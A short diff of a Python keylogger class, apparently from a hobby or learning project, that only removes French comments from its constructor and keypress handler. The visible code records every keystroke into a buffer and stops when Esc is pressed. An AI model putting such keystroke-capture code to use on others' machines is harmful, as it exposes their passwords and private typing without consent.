@@ -7,14 +7,14 @@ class KeyLoggerService(IKeyLogger):
     def __init__(self):
         self.buffer = Buffer()
         self.running = False
-        self.listener = None  # Stocke l'objet Listener
+        self.listener = None
 
     def on_press(self, key):
         try:
-            if key == keyboard.Key.esc:  # Quitter avec Échap
+            if key == keyboard.Key.esc:
                 print(" stopping keylogger...")
                 self.stop_logging()
-                return  # Sortir immédiatement
+                return
 
             key_str = key.char if hasattr(key, 'char') else str(key)
             self.buffer.add_data(key_str)
